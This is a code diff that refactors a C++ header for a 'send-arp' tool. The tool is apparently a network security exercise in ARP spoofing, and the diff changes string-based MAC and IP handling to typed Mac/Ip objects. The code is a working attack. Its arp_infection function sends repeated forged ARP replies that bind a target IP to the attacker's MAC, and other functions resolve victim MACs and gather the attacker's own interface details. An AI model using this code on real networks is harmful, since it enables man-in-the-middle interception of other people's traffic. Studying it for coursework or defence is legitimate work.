@@ -1,4 +1,5 @@
 #pragma once
+#include <iostream>
 #include <cstdio>
 #include <cstring>
 #include <cstdlib>
@@ -18,12 +19,6 @@
 #define MAC_LEN 17
 #define IP_LEN 15
 
-#define ARP_REQ 0
-#define ARP_REP 1
-
-#define TARGET 0
-#define SENDER 1
-
 #pragma pack(push, 1)
 struct EthArpPacket final
 {
@@ -32,18 +27,27 @@ struct EthArpPacket final
 };
 #pragma pack(pop)
 
+typedef enum _mode
+{
+    TARGET,SENDER,ARP_REQ,ARP_REP
+}Mode;
+
+using std::string;
+using std::cout;
+using std::endl;
+
 void usage()
 {
     printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
     printf("sudo ./send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-void send_arp(pcap_t *handle, const char *dmac, const char *smac, const char *sip, const char *tmac, const char *tip, int mode)
+void send_arp(pcap_t *handle, Mac dmac, Mac smac, Ip sip, Mac tmac, Ip tip, Mode mode)
 {
     EthArpPacket packet;
 
-    packet.eth_.dmac_ = Mac(dmac);
-    packet.eth_.smac_ = Mac(smac);
+    packet.eth_.dmac_ = dmac;
+    packet.eth_.smac_ = smac;
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -56,10 +60,10 @@ void send_arp(pcap_t *handle, const char *dmac, const char *smac, const char *si
     else if (mode == ARP_REP)
         packet.arp_.op_ = htons(ArpHdr::Reply);
 
-    packet.arp_.smac_ = Mac(smac);
-    packet.arp_.sip_ = htonl(Ip(sip));
-    packet.arp_.tmac_ = Mac(tmac);
-    packet.arp_.tip_ = htonl(Ip(tip));
+    packet.arp_.smac_ = smac;
+    packet.arp_.sip_ = htonl(sip);
+    packet.arp_.tmac_ = tmac;
+    packet.arp_.tip_ = htonl(tip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
     if (res != 0)
@@ -69,34 +73,22 @@ void send_arp(pcap_t *handle, const char *dmac, const char *smac, const char *si
     }
 }
 
-void arp_infection(pcap_t *handle, const char *s_mac, const char *s_ip, const char *t_ip, const char *a_mac)
+void arp_infection(pcap_t *handle, Mac s_mac, Ip s_ip, Ip t_ip, Mac a_mac)
 {
-    for (int i = 0; i < 5; i++) //just in case
+    for (int i = 0; i < 5; i++)
+    {
         send_arp(handle, s_mac, a_mac, t_ip, s_mac, s_ip, ARP_REP);
+    }
 }
 
-char *get_target_mac(uint8_t *mac)
-{
-    static __thread char buf[MAC_LEN + 1] = {0};
-    snprintf(buf, sizeof(buf),
-             "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
-             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-    return buf;
-}
-char *get_sender_mac(uint8_t *mac)
-{
-    static __thread char buf[MAC_LEN + 1] = {0};
-    snprintf(buf, sizeof(buf),
-             "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
-             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-    return buf;
-}
-char *get_mac_by_arp(pcap_t *handle, const char *a_mac, const char *a_ip, const char *t_ip, int mode)
+Mac resolve_mac_by_arp(pcap_t *handle, Mac a_mac, Ip a_ip, Ip t_ip, Mode mode)
 {
     struct pcap_pkthdr *header;
     const u_char *packet;
+    Mac broadcast = Mac("ff:ff:ff:ff:ff:ff");
+    Mac lookup = Mac("00:00:00:00:00:00");
 
-    send_arp(handle, "ff:ff:ff:ff:ff:ff", a_mac, a_ip, "00:00:00:00:00:00", t_ip, ARP_REQ); //send arp req to target
+    send_arp(handle, broadcast, a_mac, a_ip, lookup, t_ip, ARP_REQ);
 
     struct ArpHdr arp;
 
@@ -117,23 +109,17 @@ char *get_mac_by_arp(pcap_t *handle, const char *a_mac, const char *a_ip, const 
             struct Ip chk_a_ip(a_ip);
             struct Mac chk_a_mac(a_mac);
             struct Ip chk_t_ip(t_ip);
-            if (chk_a_ip == arp.tip() && chk_t_ip == arp.sip() && chk_a_mac == arp.tmac())
+            if (arp.op_ == htons(ArpHdr::Reply) && chk_a_ip == arp.tip() && chk_t_ip == arp.sip() && chk_a_mac == arp.tmac())
                 break;
         }
     }
 
-    Mac src_mac = arp.smac();
-    uint8_t *smac = reinterpret_cast<uint8_t *>(&src_mac);
-
-    if (mode == TARGET)
-        return get_target_mac(smac);
-    else
-        return get_sender_mac(smac);
+    return arp.smac();
 }
 
-char *get_attacker_mac(const char *dev)
+Mac get_attacker_mac(const char *dev)
 {
-    static __thread char buf[MAC_LEN + 1] = {0};
+    char buf[MAC_LEN + 1] = {0};
 
     int len = strlen(dev);
     int sz = len + 24; //NULL considerd
@@ -162,13 +148,13 @@ char *get_attacker_mac(const char *dev)
 
     free(path);
     close(fd);
-    return buf;
+    return Mac(buf);
 }
 
-char *get_attacker_ip(const char *dev)
+Ip get_attacker_ip(const char *dev)
 {
     struct ifreq ifr;
-    static __thread char ip[IP_LEN + 1] = {0};
+    char buf[IP_LEN+1] = {0};
 
     int s = socket(AF_INET, SOCK_DGRAM, 0);
     if (s == -1)
@@ -184,21 +170,21 @@ char *get_attacker_ip(const char *dev)
         exit(-1);
     }
     else
-        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short), ip, sizeof(struct sockaddr));
+        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short),buf,sizeof(struct sockaddr));
 
     close(s);
-    return ip;
+    return Ip(buf);
 }
 
-void show_info(const char *s_ip, const char *s_mac, const char *t_ip, const char *t_mac, const char *a_ip, const char *a_mac)
+void show_info(Ip s_ip, Mac s_mac, Ip t_ip, Mac t_mac, Ip a_ip, Mac a_mac)
 {
     puts("====Sender====");
-    printf("IP : %s\n", s_ip);
-    printf("MAC : %s\n", s_mac);
+    cout << "IP : " << std::string(s_ip) << endl;//%s\n", std::string(s_ip));
+    cout << "MAC : " << std::string(s_mac) << endl;//%s\n", std::string(s_mac));
     puts("====Target====");
-    printf("IP : %s\n", t_ip);
-    printf("MAC : %s\n", t_mac);
+    cout << "IP : " << std::string(t_ip) << endl; //%s\n", std::string(t_ip));
+    cout << "MAC : " << std::string(t_mac) << endl; //%s\n", std::string(t_mac));
     puts("====Attacker====");
-    printf("IP : %s\n", a_ip);
-    printf("MAC : %s\n", a_mac);
+    cout << "IP : " << std::string(a_ip) << endl; //%s\n", std::string(a_ip));
+    cout << "MAC : " << std::string(a_mac) << endl; //%s\n", std::string(a_mac));
 }
